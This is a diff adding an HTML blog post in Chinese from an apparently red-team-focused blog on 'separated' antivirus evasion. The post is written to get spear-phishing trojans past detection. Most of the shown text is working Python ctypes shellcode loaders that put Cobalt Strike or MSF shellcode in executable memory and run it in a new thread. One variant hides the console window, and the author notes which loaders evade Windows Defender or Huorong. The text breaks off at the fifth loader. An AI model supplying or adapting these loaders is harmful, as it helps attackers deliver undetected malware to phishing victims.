@@ -1,0 +1,722 @@
+<!DOCTYPE html>
+<html lang="en-us" class="light">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.118.2">
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="generator" content="Saber v0.11.2">
+    <meta name="author" content="F0rmat" />
+    <meta name="keywords" content="专注于信息安全、内网渗透、红队攻防" />
+    <meta name="og:site_name" content="F0rmat&#39;s Blog" />
+    <link rel="canonical" href="https://xxe.icu/python_separation_to_antivirus.html" /><meta property="og:type" content="article" />
+    <meta property="title" content="免杀技术- Python分离免杀 - F0rmat&#39;s Blog">
+    <meta property="og:title" content="免杀技术- Python分离免杀 - F0rmat&#39;s Blog">
+    <meta property="twitter:title" content="免杀技术- Python分离免杀 - F0rmat&#39;s Blog">
+    <meta name="description" content="0x00 前言 最新复习了一下鱼叉攻击的内容，发现在制作木马这一块过不去了，各种被查杀，于是又重新复习了一下免杀这块的内容。 网上也有很多教程文章，还是">
+    <meta property="og:description" content="0x00 前言 最新复习了一下鱼叉攻击的内容，发现在制作木马这一块过不去了，各种被查杀，于是又重新复习了一下免杀这块的内容。 网上也有很多教程文章，还是">
+    <meta property="twitter:description" content="0x00 前言 最新复习了一下鱼叉攻击的内容，发现在制作木马这一块过不去了，各种被查杀，于是又重新复习了一下免杀这块的内容。 网上也有很多教程文章，还是">
+    <meta property="og:type" content="article">
+    <title>免杀技术- Python分离免杀 - F0rmat&#39;s Blog</title>
+
+    <meta property="og:url" content="https://xxe.icu/python_separation_to_antivirus.html" />
+
+    
+    <meta property="og:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
+    <meta property="twitter:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
+    <link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/16066632?v=4" type="image/x-png" />
+    
+      
+      <link rel="stylesheet" href="/css/main.min.dbdd30bb57b959228eef6e0f4a297b76d6edfad348d99701f8d68535ea50105a.css" integrity="sha256-290wu1e5WSKO724PSil7dtbt+tNI2ZcB+NaFNepQEFo="/>
+    
+    
+  <link rel="stylesheet" href="/css/syntax.css"/>
+
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_1607597_jhmihcvh0tm.css" />
+    <link href="/index.xml" rel="alternate" type="application/rss+xml" title="F0rmat&#39;s Blog">
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</head>
+
+<body class="bg-gray-100 dark:bg-gray-700 text-gray-900 dark:text-gray-100 tracking-wider leading-normal">
+
+    <nav id="header" class="bg-white dark:bg-gray-800 fixed w-full z-10 top-0 shadow">
+
+  <div id="progress" class="h-1 z-20 top-0" style="background:linear-gradient(to right, #4dc0b5 var(--scroll), transparent 0);"></div>
+
+  <div class="w-full container mx-auto flex flex-wrap items-center justify-between my-1">
+      <div class="pl-4">
+          <a class="text-base no-underline hover:no-underline font-bold"  href="/">
+              F0rmat&#39;s Blog
+          </a>
+      </div>
+
+      <div class="block lg:hidden pr-4">
+          <button id="nav-toggle" class="flex items-center px-3 py-2 border rounded text-gray-500 border-gray-600 hover:text-gray-900 hover:border-teal-500 appearance-none focus:outline-none">
+              <svg class="fill-current h-3 w-3" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><title>Menu</title><path d="M0 3h20v2H0V3zm0 6h20v2H0V9zm0 6h20v2H0v-2z"/></svg>
+          </button>
+      </div>
+
+      <div class="w-full flex-grow lg:flex lg:items-center lg:w-auto hidden mt-2 lg:mt-0 bg-gray-100 dark:bg-gray-800 md:bg-transparent z-20" id="nav-content">
+          <ul class="list-none lg:flex justify-end flex-1 items-center">
+                    <li class="mr-3">
+                    <a href="/" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">HOME</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/posts.html" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">ARCHIVE</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/about.html" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">ABOUT</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/atom.xml" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">RSS</a>
+                    </li>
+                <button id="switchTheme" class="h-10 w-10 flex justify-center items-center focus:outline-none">
+                    <div id="dark-icon" class="hidden">
+                        <svg data-v-297af853="" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6"><title data-v-297af853="">Dark Mode</title> <path data-v-297af853="" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path></svg>
+                    </div>
+                    <div id="light-icon">
+                        <svg data-v-297af853="" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6"><title data-v-297af853="">Light Mode</title> <path data-v-297af853="" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path></svg>
+                    </div> 
+                </button>
+          </ul>
+      </div>
+  </div>
+</nav>
+
+    <div id="container" class="container w-full flex flex-wrap mx-auto px-2 lg:pt-12 mt-10">
+<section class="w-full lg:w-3/4 xl:w-3/4">
+
+    
+    <div class="px-8 py-6 mt-6 lg:mt-0 leading-normal rounded shadow bg-white dark:bg-gray-800">
+
+        
+        <div>
+    <h1 class="font-bold break-normal text-gray-800 pt-2 pb-2 text-2xl lg:text-3xl dark:text-gray-200">
+        <a href="https://xxe.icu/python_separation_to_antivirus.html" title="免杀技术- Python分离免杀">免杀技术- Python分离免杀</a>
+    </h1>
+    <p class="mb-1 text-sm text-gray-500 dark:text-gray-200">
+        <span title=" 2022-04-01 11:04:34 CST">
+            <i class="iconfont icon-calendar" aria-hidden="true"></i> 01 Apr 2022
+        </span>
+
+        <span class="hidden xl:inline-block">
+            |
+            <i class="iconfont icon-book"></i>
+            1818 字
+        </span>
+
+        <span class="hidden xl:inline-block">
+            |
+            <i class="iconfont icon-clock-o"></i>
+            4 分钟读完
+        </span>
+    </p>
+</div>
+
+
+        <div class="md:hidden dark:text-gray-100">
+            
+<p class="text-base font-bold py-2 yg:pb-6 text-gray-700 dark:text-gray-300">文章目录</p>
+    <div class="sticky text-sm" style="top:6em;" id="menu-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-前言">0x00 前言</a></li>
+    <li><a href="#0x01-shellcode-loader原理">0x01 Shellcode Loader原理</a>
+      <ul>
+        <li><a href="#shellcode">Shellcode</a></li>
+        <li><a href="#loader加载器">loader加载器</a>
+          <ul>
+            <li><a href="#加载器原理">加载器原理</a></li>
+            <li><a href="#32位和64位问题报错">32位和64位问题报错</a></li>
+            <li><a href="#第一种">第一种</a></li>
+            <li><a href="#第二种">第二种</a></li>
+            <li><a href="#第三种">第三种</a></li>
+            <li><a href="#第四种">第四种</a></li>
+            <li><a href="#第五种">第五种</a></li>
+          </ul>
+    </li>
+    <li><a href="#0x02-实战">0x02 实战</a>
+      <ul>
+        <li><a href="#1生成shellcode">1、生成shellcode</a></li>
+        <li><a href="#2编写loader代码">2、编写Loader代码</a></li>
+        <li><a href="#3python转exe">3、Python转Exe</a></li>
+        <li><a href="#4测试免杀效果">4、测试免杀效果</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x03-参考">0x03 参考</a></li>
+  </ul>
+</nav>
+    </div>
+
+        </div> 
+
+        <div class="post-content dark:text-gray-300">
+            <h1 id="0x00-前言">0x00 前言</h1>
+<p>最新复习了一下鱼叉攻击的内容，发现在制作木马这一块过不去了，各种被查杀，于是又重新复习了一下免杀这块的内容。</p>
+<p>网上也有很多教程文章，还是不错的，本文将使用CS作为例子，MSF其实差不多的，废话不多说，直接开始！</p>
+<h1 id="0x01-shellcode-loader原理">0x01 Shellcode Loader原理</h1>
+<p>我们做免杀之前先了解一下一些基础知识，比如说shellcode是什么。</p>
+<ul>
+<li>
+<p>shellcode是一段用于利用软件漏洞的有效负载代码，以其经常让攻击者获得shell而得名</p>
+</li>
+<li>
+<p>shellcode loader是用来运行shellcode的加载器</p>
+</li>
+</ul>
+<p>那何为分离免杀呢？</p>
+<p>比如说你在MSF生成了一个exe，那么可执行文件里面就包含了shellcode和shellcode loader。</p>
+<p>因为MSF默认生成的shellcode loader是不变的，是很容易被杀软识别出来的。</p>
+<p>所以我们将shellcode分离出来做处理，分别对两块进行编码混淆。</p>
+<h2 id="shellcode">Shellcode</h2>
+<p>比如CS生成的一段payload，buf就是shellcode了：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/python_separation_to_antivirus/4.png" alt="4"></p>
+<h2 id="loader加载器">loader加载器</h2>
+<p>加载器可以使用C、C#、Python等来写，笔者尝试用C来写加载器的时候发现很容易就被查杀了，所以实践了Python生成exe可执行文件进行免杀，效果还是不错的。</p>
+<h3 id="加载器原理">加载器原理</h3>
+<p>这部分就不在这里说了，可以参考大佬的文章<a href="https://mp.weixin.qq.com/s?__biz=MzIwOTMzMzY0Ng==&amp;mid=2247484538&amp;idx=1&amp;sn=a23fec3cad596102d30a99bad6c27b85&amp;chksm=9774389ba003b18d5428ed6f75490b8cda7f9dcae2e9726ad42ac2d939794c103a7f561f905e&amp;scene=21#wechat_redirect">CS免杀-Shellcode Loader原理(python)</a></p>
+<p>大家可能会发现VirtualAlloc函数的flAllocationType参数有多种选择，可以参考微软官网的说明：<a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">VirtualAlloc function</a></p>
+<h3 id="32位和64位问题报错">32位和64位问题报错</h3>
+<p>首先在这里说下面的这个报错：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">OSError: exception: access violation writing
+</span></span></code></pre></div><p>python在申请内存的时候默认是使用32位的，由于x86和x64的兼容性问题导致了内存不可写。</p>
+<p>比如系统是64位的就要加上下面的语句：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="o">.</span><span class="n">restype</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span>
+</span></span></code></pre></div><p>并且在<code>RtlMoveMemory</code>加上64位的类型：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span><span class="p">(</span><span class="n">rwxpage</span><span class="p">),</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">create_string_buffer</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
+</span></span></code></pre></div><p>下面是网上分享的各种加载shellcode的代码：</p>
+<h3 id="第一种">第一种</h3>
+<p>这一段被用的太多了，导致刚生成exe可执行文件就被微软查杀：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ctypes</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ptr</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                                          <span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)),</span>
+</span></span><span class="line"><span class="cl">                                          <span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mh">0x3000</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                                          <span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mh">0x40</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">=</span> <span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_char</span> <span class="o">*</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span><span class="o">.</span><span class="n">from_buffer</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="n">ptr</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                                     <span class="n">buf</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                     <span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ht</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">CreateThread</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                                         <span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                                         <span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="n">ptr</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                                         <span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                                         <span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                                         <span class="n">ctypes</span><span class="o">.</span><span class="n">pointer</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="n">ht</span><span class="p">),</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
+</span></span></code></pre></div><h3 id="第二种">第二种</h3>
+<p>64位测试失败：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode_one</span> <span class="o">=</span> <span class="n">create_string_buffer</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode_run</span> <span class="o">=</span> <span class="n">cast</span><span class="p">(</span><span class="n">shellcode_one</span><span class="p">,</span> <span class="n">CFUNCTYPE</span><span class="p">(</span><span class="n">c_void_p</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode_run</span><span class="p">()</span>
+</span></span></code></pre></div><h3 id="第三种">第三种</h3>
+<p>64位测试失败：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ctypes</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">=</span>  <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#libc = CDLL(&#39;libc.so.6&#39;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">PROT_READ</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">PROT_WRITE</span> <span class="o">=</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl"><span class="n">PROT_EXEC</span> <span class="o">=</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">executable_code</span><span class="p">(</span><span class="n">buffer</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">buf</span> <span class="o">=</span> <span class="n">c_char_p</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">size</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">valloc</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">addr</span> <span class="o">=</span> <span class="n">c_void_p</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="mi">0</span> <span class="o">==</span> <span class="n">addr</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s2">&#34;Failed to allocate memory&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">memmove</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="mi">0</span> <span class="o">!=</span> <span class="n">libc</span><span class="o">.</span><span class="n">mprotect</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span> <span class="o">|</span> <span class="n">PROT_EXEC</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s2">&#34;Failed to set protection on buffer&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">addr</span>
+</span></span><span class="line"><span class="cl"><span class="n">VirtualAlloc</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span>
+</span></span><span class="line"><span class="cl"><span class="n">VirtualProtect</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualProtect</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">whnd</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">GetConsoleWindow</span><span class="p">()</span>   
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">whnd</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">       <span class="k">if</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">              <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">user32</span><span class="o">.</span><span class="n">ShowWindow</span><span class="p">(</span><span class="n">whnd</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>   
+</span></span><span class="line"><span class="cl">              <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">whnd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">memorywithshell</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                                          <span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)),</span>
+</span></span><span class="line"><span class="cl">                                          <span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mh">0x3000</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                                          <span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mh">0x40</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">=</span> <span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_char</span> <span class="o">*</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span><span class="o">.</span><span class="n">from_buffer</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">old</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_long</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">VirtualProtect</span><span class="p">(</span><span class="n">memorywithshell</span><span class="p">,</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)),</span><span class="mh">0x40</span><span class="p">,</span><span class="n">ctypes</span><span class="o">.</span><span class="n">byref</span><span class="p">(</span><span class="n">old</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="n">memorywithshell</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                                     <span class="n">buf</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                     <span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl"><span class="n">shell</span> <span class="o">=</span> <span class="n">cast</span><span class="p">(</span><span class="n">memorywithshell</span><span class="p">,</span> <span class="n">CFUNCTYPE</span><span class="p">(</span><span class="n">c_void_p</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">shell</span><span class="p">()</span>
+</span></span></code></pre></div><h3 id="第四种">第四种</h3>
+<p>这个可以正常使用，并且不会被微软默认杀软杀掉，但是会被火绒查杀：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ctypes</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span><span class="sa">b</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">rwxpage</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">rwxpage</span><span class="p">,</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">create_string_buffer</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">handle</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">rwxpage</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">handle</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span></code></pre></div><p>如果是64位使用下面的代码：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ctypes</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span><span class="sa">b</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="o">.</span><span class="n">restype</span><span class="o">=</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span>
+</span></span><span class="line"><span class="cl"><span class="n">rwxpage</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span><span class="p">(</span><span class="n">rwxpage</span><span class="p">),</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">create_string_buffer</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">handle</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span><span class="p">(</span><span class="n">rwxpage</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">handle</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span></code></pre></div><h3 id="第五种">第五种</h3>
+<p>在64位系统测试成功：</p>
